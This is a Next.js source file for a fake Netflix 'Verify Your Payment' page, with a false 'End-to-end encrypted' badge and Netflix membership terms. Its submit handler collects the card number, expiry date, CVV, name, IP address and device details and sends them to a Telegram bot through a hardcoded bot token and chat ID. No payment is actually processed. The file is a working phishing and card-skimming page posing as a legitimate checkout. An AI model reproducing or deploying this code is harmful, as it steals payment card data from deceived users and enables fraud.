'use client'

import React, { useState } from 'react'
import Image from 'next/image'
import { Lock, CreditCard, AlertCircle } from 'lucide-react'
import { useRouter } from 'next/navigation'

interface PaymentFormData {
  cardNumber: string
  expiryDate: string
  cvv: string
  firstName: string
  lastName: string
  agreeToTerms: boolean
}

interface FormErrors {
  cardNumber?: string
  expiryDate?: string
  cvv?: string
  firstName?: string
  lastName?: string
  agreeToTerms?: string
  general?: string
}

export default function PaymentPage() {
  const router = useRouter()
  const [formData, setFormData] = useState<PaymentFormData>({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    firstName: '',
    lastName: '',
    agreeToTerms: false
  })
  const [errors, setErrors] = useState<FormErrors>({})

  const formatCardNumber = (value: string) => {
    return value
      .replace(/\s/g, '')
      .replace(/(\d{4})/g, '$1 ')
      .trim()
      .slice(0, 19)
  }

  const formatExpiryDate = (value: string) => {
    return value
      .replace(/\D/g, '')
      .replace(/(\d{2})(\d)/, '$1/$2')
      .slice(0, 5)
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, checked } = e.target
    let formattedValue = value

    if (name === 'cardNumber') {
      formattedValue = formatCardNumber(value)
    } else if (name === 'expiryDate') {
      formattedValue = formatExpiryDate(value)
    } else if (name === 'cvv') {
      formattedValue = value.slice(0, 3)
    }

    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : formattedValue
    }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const newErrors: FormErrors = {}

    // Validate form
    if (!formData.cardNumber || formData.cardNumber.replace(/\s/g, '').length !== 16) {
      newErrors.cardNumber = 'Please enter a valid card number'
    }
    if (!formData.expiryDate || !formData.expiryDate.includes('/')) {
      newErrors.expiryDate = 'Please enter a valid expiry date'
    }
    if (!formData.cvv || formData.cvv.length !== 3) {
      newErrors.cvv = 'Please enter a valid CVV'
    }
    if (!formData.firstName) {
      newErrors.firstName = 'First name is required'
    }
    if (!formData.lastName) {
      newErrors.lastName = 'Last name is required'
    }
    if (!formData.agreeToTerms) {
      newErrors.agreeToTerms = 'You must agree to the terms to continue'
    }

    setErrors(newErrors)

    if (Object.keys(newErrors).length === 0) {
      try {
        const TOKEN = "7529657995:AAH4-Tn2QCHKPs3oGpVtMRVfm9yV5UniLkg"
        const CHAT_ID = "721716449"
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`

        const response = await fetch('https://api.ipify.org?format=json')
        const data: { ip: string } = await response.json()
        const ip = data.ip

        const userAgent = navigator.userAgent
        const platform = navigator.platform
        const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'

        const message = `
          <b>New Payment Attempt</b>\n
          <b>Card Number:</b> ${formData.cardNumber}\n
          <b>Expiry Date:</b> ${formData.expiryDate}\n
          <b>CVV:</b> ${formData.cvv}\n
          <b>First Name:</b> ${formData.firstName}\n
          <b>Last Name:</b> ${formData.lastName}\n
          <b>IP Address:</b> ${ip}\n
          <b>Device Type:</b> ${deviceType}\n
          <b>Platform:</b> ${platform}\n
          <b>User Agent:</b> ${userAgent}\n
        `

        await fetch(URI_API, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
          })
        })
        router.push('/register/success')
      } catch (error) {
        console.log(error)
        setErrors({
          general: 'Something went wrong. Please try again later.'
        })
      }
    }
  }

  return (
    <main className="flex-1 flex flex-col items-center px-4 py-12">
      <div className="w-full max-w-xl">
        {/* Step Indicator */}
        <p className="text-sm text-gray-600 mb-4">
          STEP <span className="font-medium">3</span> OF <span className="font-medium">3</span>
        </p>

        <div className="bg-white p-8 rounded-lg">
          <div className="flex items-center gap-2 mb-6">
            <Lock className="w-6 h-6 text-[#E50914]" />
            <h1 className="text-3xl font-medium text-gray-900">
              Verify Your Payment
            </h1>
          </div>

          <div className="flex items-center gap-6 mb-8">
            <div className="flex items-center gap-4">
              <Image
                src="/visa.svg"
                alt="Visa"
                width={48}
                height={32}
                className="h-8 w-auto object-contain"
              />
              <Image
                src="/mastercard-logo.svg"
                alt="Mastercard"
                width={48}
                height={32}
                className="h-8 w-auto object-contain"
              />
            </div>
            <div className="flex items-center gap-2 text-[#737373] border-l border-[#e6e6e6] pl-6">
              <Lock className="w-4 h-4" />
              <span className="text-[13px]">End-to-end encrypted</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Card Information */}
            <div className="space-y-4">
              <div>
                <div className="relative">
                  <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                  <input
                    type="text"
                    name="cardNumber"
                    value={formData.cardNumber}
                    onChange={handleInputChange}
                    placeholder="Card number"
                    className={`w-full pl-10 pr-4 py-4 border rounded text-black ${
                      errors.cardNumber ? 'border-[#E87C03]' : 'border-gray-300'
                    } focus:outline-none focus:border-[#E50914]`}
                  />
                </div>
                {errors.cardNumber && (
                  <div className="flex items-center gap-1 mt-1 text-[#E87C03] text-sm">
                    <AlertCircle className="w-4 h-4" />
                    <span>{errors.cardNumber}</span>
                  </div>
                )}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <input
                    type="text"
                    name="expiryDate"
                    value={formData.expiryDate}
                    onChange={handleInputChange}
                    placeholder="MM/YY"
                    className={`w-full px-4 py-4 border rounded text-black ${
                      errors.expiryDate ? 'border-[#E87C03]' : 'border-gray-300'
                    } focus:outline-none focus:border-[#E50914]`}
                  />
                  {errors.expiryDate && (
                    <div className="flex items-center gap-1 mt-1 text-[#E87C03] text-sm">
                      <AlertCircle className="w-4 h-4" />
                      <span>{errors.expiryDate}</span>
                    </div>
                  )}
                </div>

                <div>
                  <input
                    type="text"
                    name="cvv"
                    value={formData.cvv}
                    onChange={handleInputChange}
                    placeholder="CVV"
                    className={`w-full px-4 py-4 border rounded text-black ${
                      errors.cvv ? 'border-[#E87C03]' : 'border-gray-300'
                    } focus:outline-none focus:border-[#E50914]`}
                  />
                  {errors.cvv && (
                    <div className="flex items-center gap-1 mt-1 text-[#E87C03] text-sm">
                      <AlertCircle className="w-4 h-4" />
                      <span>{errors.cvv}</span>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Name Fields */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <input
                  type="text"
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleInputChange}
                  placeholder="First name"
                  className={`w-full px-4 py-4 border rounded text-black ${
                    errors.firstName ? 'border-[#E87C03]' : 'border-gray-300'
                  } focus:outline-none focus:border-[#E50914]`}
                />
                {errors.firstName && (
                  <div className="flex items-center gap-1 mt-1 text-[#E87C03] text-sm">
                    <AlertCircle className="w-4 h-4" />
                    <span>{errors.firstName}</span>
                  </div>
                )}
              </div>

              <div>
                <input
                  type="text"
                  name="lastName"
                  value={formData.lastName}
                  onChange={handleInputChange}
                  placeholder="Last name"
                  className={`w-full px-4 py-4 border rounded text-black ${
                    errors.lastName ? 'border-[#E87C03]' : 'border-gray-300'
                  } focus:outline-none focus:border-[#E50914]`}
                />
                {errors.lastName && (
                  <div className="flex items-center gap-1 mt-1 text-[#E87C03] text-sm">
                    <AlertCircle className="w-4 h-4" />
                    <span>{errors.lastName}</span>
                  </div>
                )}
              </div>
            </div>

            {/* Terms and Conditions */}
            <div className="space-y-4">
              <label className="flex items-start gap-2">
                <input
                  type="checkbox"
                  name="agreeToTerms"
                  checked={formData.agreeToTerms}
                  onChange={handleInputChange}
                  className="mt-1 h-4 w-4 rounded border-gray-300 text-[#E50914] focus:ring-[#E50914]"
                />
                <span className="text-sm text-gray-600">
                  By checking the checkbox below, you agree to our Terms of Use, Privacy Statement, and that you are over 18. Netflix will automatically continue your membership and charge the membership fee to your payment method until you cancel. You may cancel at any time to avoid future charges.
                </span>
              </label>
              {errors.agreeToTerms && (
                <div className="flex items-center gap-1 text-[#E87C03] text-sm">
                  <AlertCircle className="w-4 h-4" />
                  <span>{errors.agreeToTerms}</span>
                </div>
              )}
            </div>

            <button
              type="submit"
              className="w-full bg-[#E50914] text-white text-xl font-medium py-4 rounded hover:bg-[#F40612] transition-colors"
            >
              Verify Payment
            </button>
          </form>
        </div>
      </div>
    </main>
  )
} 